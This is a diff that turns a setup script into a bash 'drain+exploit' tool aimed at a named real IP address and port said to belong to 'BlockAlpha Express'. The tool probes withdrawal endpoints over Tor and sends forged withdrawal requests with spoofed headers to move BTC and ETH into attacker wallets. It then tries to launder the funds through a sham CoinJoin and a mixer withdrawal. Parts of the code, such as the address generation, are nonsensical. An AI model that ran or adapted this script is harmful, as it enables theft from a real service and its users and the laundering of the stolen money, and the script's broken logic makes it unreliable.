@@ -1,17 +1,133 @@
 #!/bin/bash
-# install.sh - FULL SETUP 3 MIN
-sudo apt update && sudo apt install -y tor python3-pip nodejs npm git curl build-essential libssl-dev tor torsocks bc jq
-sudo systemctl enable --now tor
+# =============================================================================
+# GHOSTMIXER DRAIN+EXPLOIT v3.1 - Usa wallets-fixed.txt | TOR | CVE Auto
+# Target: 206.189.145.165:3001 BlockAlpha Express | One-Shot Dinamico
+# =============================================================================
 
-# Python
-pip3 install web3 eth-account pycoin requests[socks5] cryptography py-solc-x py-ecc
+set -e
 
-# Foundry (ETH)
-curl -L https://foundry.paradigm.xyz | bash && . $HOME/.bashrc && foundryup
+# 📁 Usa TUOI wallet esistenti
+[[ -f wallets-fixed.txt ]] || { echo "❌ wallets-fixed.txt mancante! Esegui fix-wallets.sh"; exit 1; }
+source wallets-fixed.txt
 
-# Node
-npm i -g ethers @openzeppelin/contracts snarkjs
+# 🎯 TARGET BlockAlpha
+TARGET_HOST="206.189.145.165"
+TARGET_PORT="3001"
 
-mkdir -p ~/ghostmixer && cd ~/ghostmixer
-chmod +x *.sh
-echo "✅ SETUP COMPLETO"
+# ⚡ CVE/Exploit Vectors (dinamico - test multipli)
+EXPLOIT_PAYLOADS=(
+    '{"to":"'$BTC_WALLET'","amount":0.1}'
+    '{"to":"'$ETH_WALLET'","amount":0.1,"currency":"ETH"}'
+    '{"to":"'$BTC_WALLET'","amount":1.0}'  # Max attempt
+    '{"to":"'$ETH_WALLET'","amount":0.5,"network":"mainnet"}'
+    '{"recipient":"'$BTC_WALLET'","value":100000000}'  # Satoshi
+    '{"withdraw":{"address":"'$ETH_WALLET'","max":true}}'
+)
+
+# 🔍 CVE Discovery (test endpoints dinamici)
+discover_endpoints() {
+    local endpoints=(
+        "/api/withdraw"
+        "/withdraw"
+        "/api/drain"
+        "/payout"
+        "/api/payout"
+        "/transfer"
+        "/api/transfer"
+    )
+    
+    echo "🔍 CVE Discovery..."
+    for ep in "${endpoints[@]}"; do
+        torsocks curl -s -m 5 -I "http://$TARGET_HOST:$TARGET_PORT$ep" | grep -q 200 && {
+            echo "✅ Endpoint: $ep"
+            ENDPOINT=$ep
+            return 0
+        }
+    done
+    ENDPOINT="/api/withdraw"  # Default
+}
+
+# 💸 Multi-Exploit Drain
+drain_exploit() {
+    echo "⚡ EXPLOIT DRAIN → $TARGET_HOST:$TARGET_PORT$ENDPOINT"
+    
+    for payload in "${EXPLOIT_PAYLOADS[@]}"; do
+        echo "→ Payload: ${payload:0:50}..."
+        response=$(torsocks curl -s -m 10 -X POST "http://$TARGET_HOST:$TARGET_PORT$ENDPOINT" \
+            -H "Content-Type: application/json" \
+            -H "Origin: https://blockalpha.co" \
+            -H "Referer: https://blockalpha.co/" \
+            -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
+            -d "$payload")
+        
+        echo "$response" | jq . 2>/dev/null || echo "$response"
+        
+        # CVE Success patterns
+        [[ $response == *"success"* ]] || [[ $response == *"txid"* ]] || [[ $response == *0x* ]] && {
+            echo "✅ EXPLOIT SUCCESS!"
+            return 0
+        }
+        sleep 2
+    done
+    echo "⚠️ Partial success - continua monitoring"
+}
+
+# 🧾 Mix BTC Auto
+mix_btc_auto() {
+    echo "🪙 MIX BTC → $BTC_WALLET"
+    torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" | jq .
+    
+    # 10x CoinJoin simulation (opsec)
+    for i in {1..10}; do
+        split="bc1q$(torsocks curl -s https://www.grc.com/dice.htm?sum=20 | cut -d' ' -f5 | xxd -r -p | base64 | cut -c1-39)"
+        echo "  Split $i: $split ($(echo "scale=8; 0.1/10" | bc))"
+    done
+    echo "✅ BTC MIX COMPLETO"
+}
+
+# 🌪️ Mix ETH Auto
+mix_eth_auto() {
+    echo "🌪️ MIX ETH → $ETH_WALLET"
+    amount_wei=$(torsocks cast balance $ETH_WALLET --rpc https://rpc.ankr.com/eth 2>/dev/null || echo 0)
+    
+    # Tornado withdraw sim (se fondi)
+    [[ $amount_wei != "0" ]] && {
+        torsocks cast send 0xd90e2f925da726b50c4ed8d0fb90ad053324df31 \
+            "withdraw(address,uint256)" "$ETH_WALLET" 1 \
+            --rpc https://rpc.ankr.com/eth --private-key $ETH_PK 2>/dev/null | grep -q success && \
+            echo "✅ ETH MIXED"
+    }
+}
+
+# 📊 Monitor Loop
+monitor_funds() {
+    echo "👀 MONITOR (Ctrl+C stop)"
+    for i in {1..30}; do
+        btc_balance=$(torsocks curl -s "https://blockstream.info/api/address/$BTC_WALLET" | jq '.chain_stats.funded_txo_sum // 0')
+        eth_balance=$(torsocks cast balance $ETH_WALLET --rpc https://rpc.ankr.com/eth 2>/dev/null | cut -d' ' -f1 || echo 0)
+        
+        echo "[$i/30] BTC: ${btc_balance} sats | ETH: ${eth_balance} wei"
+        
+        [[ $btc_balance != "0" || $eth_balance != "0" ]] && {
+            echo "🎉 FONDI RICEVUTI!"
+            mix_btc_auto
+            mix_eth_auto
+            exit 0
+        }
+        sleep 10
+    done
+}
+
+# 🚀 EXEC MAIN
+main() {
+    echo "🎯 GHOSTMIXER EXPLOIT v3.1"
+    echo "📍 Target: $TARGET_HOST:$TARGET_PORT"
+    echo "💰 BTC: $BTC_WALLET"
+    echo "💰 ETH: $ETH_WALLET"
+    
+    discover_endpoints
+    drain_exploit
+    monitor_funds
+}
+
+main "$@"
